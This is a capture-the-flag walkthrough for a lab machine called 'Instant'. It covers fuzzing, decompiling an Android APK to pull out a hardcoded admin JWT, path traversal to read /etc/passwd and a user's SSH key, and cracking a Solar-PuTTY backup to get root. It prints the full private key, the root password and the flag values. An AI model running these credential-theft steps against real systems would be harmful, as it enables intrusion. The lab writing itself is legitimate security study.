---
sticker: lucide//wallet
---
# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22   | ssh     |
| 80   | http    |
We need to add `instant.htb` to `/etc/hosts`:

```bash
echo '10.10.11.37 instant.htb' | sudo tee -a /etc/hosts
```


# RECONNAISSANCE
---

![Pasted image 20250228153935.png](../../IMAGES/Pasted%20image%2020250228153935.png)

Let's try to fuzz for subdomains:

```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://instant.htb/ -H "Host:FUZZ.instant.htb" -fc 301 -ic -c -t 200

:: Progress: [114437/114437] :: Job [1/1] :: 260 req/sec :: Duration: [0:01:09] :: Errors: 0 ::
```



Nothing, let's try to fuzz for hidden directories:

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://instant.htb/" -ic -c -t 200

img                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 115ms]
downloads               [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 572ms]
js                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 105ms]
css                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 438ms]
javascript              [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 106ms]
```

Nothing useful too, let's proceed by analyzing the source code and the functionalities of the web application:


![Pasted image 20250228155330.png](../../IMAGES/Pasted%20image%2020250228155330.png)

A good approach would analyzing the apk we installed, for this, let's use the apktool installed in kali:


```
apktool d instant.apk
```

This creates a directory, let's check it out:

```
> ls

assets  kotlin  lib  META-INF  original  res  smali  unknown  AndroidManifest.xml  apktool.yml
```

We can check the network security configuration at `/instant/res/xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <domain-config cleartextTrafficPermitted="true">
        <domain includeSubdomains="true">mywalletv1.instant.htb</domain>
        <domain includeSubdomains="true">swagger-ui.instant.htb</domain>
    </domain-config>
</network-security-config>
```

We can see two subdomains, let's add them and proceed to analyze them:

![Pasted image 20250228172047.png](../../IMAGES/Pasted%20image%2020250228172047.png)

Let's start exploitation.


# EXPLOITATION
---

At first site, the second subdomain has got this:

![Pasted image 20250228172118.png](../../IMAGES/Pasted%20image%2020250228172118.png)


Let's check how to register an user:

![Pasted image 20250228172149.png](../../IMAGES/Pasted%20image%2020250228172149.png)


Let's try registering an user:



```
curl -X POST "http://swagger-ui.instant.htb/api/v1/register" -H  "accept: application/json" -H  "Content-Type: application/json" -d "{  \"email\": \"string\",  \"password\": \"test\",  \"pin\": \"10001\",  \"username\": \"test\"}"

{"Description":"User Registered! Login Now!","Status":201}
```


We can now login and check our details:

![Pasted image 20250228172525.png](../../IMAGES/Pasted%20image%2020250228172525.png)

We got an access token, let's decode it:

![Pasted image 20250228172641.png](../../IMAGES/Pasted%20image%2020250228172641.png)

We can see our role, we are not admin user obviously but this helps us understand that if we get the token of an admin user, we can interact with the application more, let's go back to our `/instant` directory

```
â¯ grep -r -i "admin"
smali/com/instantlabs/instant/AdminActivities$1.smali:.class Lcom/instantlabs/instant/AdminActivities$1;
smali/com/instantlabs/instant/AdminActivities$1.smali:.source "AdminActivities.java"
smali/com/instantlabs/instant/AdminActivities$1.smali:    value = Lcom/instantlabs/instant/AdminActivities;->TestAdminAuthorization()Ljava/lang/String;
smali/com/instantlabs/instant/AdminActivities$1.smali:.field final synthetic this$0:Lcom/instantlabs/instant/AdminActivities;
smali/com/instantlabs/instant/AdminActivities$1.smali:    const-class v0, Lcom/instantlabs/instant/AdminActivities;
smali/com/instantlabs/instant/AdminActivities$1.smali:.method constructor <init>(Lcom/instantlabs/instant/AdminActivities;)V
smali/com/instantlabs/instant/AdminActivities$1.smali:    iput-object p1, p0, Lcom/instantlabs/instant/AdminActivities$1;->this$0:Lcom/instantlabs/instant/AdminActivities;
smali/com/instantlabs/instant/AdminActivities.smali:.class public Lcom/instantlabs/instant/AdminActivities;
smali/com/instantlabs/instant/AdminActivities.smali:.source "AdminActivities.java"
smali/com/instantlabs/instant/AdminActivities.smali:.method private TestAdminAuthorization()Ljava/lang/String;
smali/com/instantlabs/instant/AdminActivities.smali:    new-instance v1, Lcom/instantlabs/instant/AdminActivities$1;
smali/com/instantlabs/instant/AdminActivities.smali:    invoke-direct {v1, p0}, Lcom/instantlabs/instant/AdminActivities$1;-><init>(Lcom/instantlabs/instant/AdminActivities;)V
smali/androidx/core/content/ContextCompat$LegacyServiceMapHolder.smali:    const-class v1, Landroid/app/admin/DevicePolicyManager;
```


The most interesting one would be the:

```
value = Lcom/instantlabs/instant/AdminActivities;->TestAdminAuthorization()Ljava/lang/String;
```

Let's read it:

```
 move-result-object v1

    const-string v2, "Authorization"

    const-string v3, "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"

    .line 25
    invoke-virtual {v1, v2, v3}, Lokhttp3/Request$Builder;->addHeader(Ljava/lang/String;Ljava/lang/String;)Lokhttp3/Request$Builder;

```

If we decode the jwt:

![Pasted image 20250228173322.png](../../IMAGES/Pasted%20image%2020250228173322.png)

Nice, this is the admin token, let's authorize with the token and use this:


![Pasted image 20250228173451.png](../../IMAGES/Pasted%20image%2020250228173451.png)


Now, if I'm right, we can read files from the server, let's read `/etc/passwd`, we need to apply some path traversal:


![Pasted image 20250228173614.png](../../IMAGES/Pasted%20image%2020250228173614.png)

There we are, we find the user `shirohige`, let's try reading this user `id_rsa`:

![Pasted image 20250228173728.png](../../IMAGES/Pasted%20image%2020250228173728.png)

Nice, this is the `id_rsa`:

```
"-----BEGIN OPENSSH PRIVATE KEY-----\n",
"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\n",
"-----END OPENSSH PRIVATE KEY-----\n"
```

We need to format it, this is the formatted one:

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Let's add it to a file named `id_rsa` and do this:

```
nano id_rsa

chmod 600 id_rsa

ssh shirohige@10.10.11.37

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri Feb 28 15:48:09 2025 from 10.10.16.44
shirohige@instant:~$
```

Nice, now we got our shell, let's read `user.txt`:

```
shirohige@instant:~$ cat user.txt
9a127d8b683be1cdb9092058e626403c
```

Time to begin PRIVESC.



# PRIVILEGE ESCALATION
---

Let's use linpeas and check the output:


![Pasted image 20250228174817.png](../../IMAGES/Pasted%20image%2020250228174817.png)


Linpeas finds the following:

![Pasted image 20250228175049.png](../../IMAGES/Pasted%20image%2020250228175049.png)

We got an admin hash for a db:

```
pbkdf2:sha256:600000$I5bFyb0ZzD69pNX8$e9e4ea5c280e0766612295ab9bff32e5fa1de8f6cbb6586fab7ab7bc762bd978
```

Let's try downloading that `instant.db` file to our machine and analyze it:

```
scp -i id_rsa shirohige@instant.htb:/home/shirohige/projects/mywallet/Instant-Api/mywallet/instance/instant.db ./ 

instant.db                                                    100%   36KB 113.0KB/s 
```

Now, let's open it then, for this, let's use `sqlitebrowser` to have a GUI:

![Pasted image 20250228175541.png](../../IMAGES/Pasted%20image%2020250228175541.png)

This algorithm would take a ridiculous amount of time to crack, let's search for something more, looking back at the linpeas scan, we find another thing:

![Pasted image 20250228175731.png](../../IMAGES/Pasted%20image%2020250228175731.png)

We got a backups folder, let's take a look:

```
shirohige@instant:/opt/backups/Solar-PuTTY$ ls
sessions-backup.dat
```

There's a `sessions-backup.dat`, after a search, we can find this script that decrypts solar putty: [script](https://github.com/Dimont-Gattsu/SolarPuttyDecrypterPy)

Let's use it:

```
python decrypt2.py sessions-backup.dat /usr/share/wordlists/rockyou.txt

-----------------------------------------------------
SolarPutty's Sessions Decrypter (Python Version)
-----------------------------------------------------
File content (first 50 bytes): b'ZJlEkpkqLgj2PlzCyLk4gtCfsGO2CMirJoxxdpclYTlEshKzJw'
Trying password: estrellaal
Potential successful decryption with password: estrella
Decrypted content (first 200 bytes):
b'\xacuY\xff\x11\xfbD\xba\xb3\xe2\xc8\x80pB\xbe\xceU\xed;\x8f)\x10\xb5Ins":[{"Id":"066894ee-635c-4578-86d0-d36d4838115b","Ip":"10.10.11.37","Port":22,"ConnectionType":1,"SessionName":"Instant","Authentication":0,"CredentialsID":"452ed919-530e-419b'
```

Nice, let's read our decrypted file:

```
cat SolarPutty_sessions_decrypted_estrella.bin

[{"Id":"066894ee-635c-4578-86d0-d36d4838115b","Ip":"10.10.11.37","Port":22,"ConnectionType":1,"SessionName":"Instant","Authentication":0,"CredentialsID":"452ed919-530e-419b-b721-da76cbe8ed04","AuthenticateScript":"00000000-0000-0000-0000-000000000000","LastTimeOpen":"0001-01-01T00:00:00","OpenCounter":1,"SerialLine":null,"Speed":0,"Color":"#FF176998","TelnetConnectionWaitSeconds":1,"LoggingEnabled":false,"RemoteDirectory":""}],"Credentials":[{"Id":"452ed919-530e-419b-b721-da76cbe8ed04","CredentialsName":"instant-root","Username":"root","Password":"12**24nzC!r0c%q12","PrivateKeyPath":"","Passphrase":"","PrivateKeyContent":null}],"AuthScript":[],"Groups":[],"Tunnels":[],"LogsFolderDestination":"C:\\ProgramData\\SolarWinds\\Logs\\Solar-PuTTY\\SessionLogs"}
```

And we got our `root` password, these are the credentials:

```
`root`:`12**24nzC!r0c%q12`
```

We can now switch users:

```
shirohige@instant:/opt/backups/Solar-PuTTY$ su root
Password:
root@instant:/opt/backups/Solar-PuTTY# whoami
root
```

Nice, let's simply read `root.txt`:

```
root@instant:/opt/backups/Solar-PuTTY# cat /root/root.txt
605c2864e2457606e34dbd95472c04e3
```


![Pasted image 20250228180726.png](../../IMAGES/Pasted%20image%2020250228180726.png)


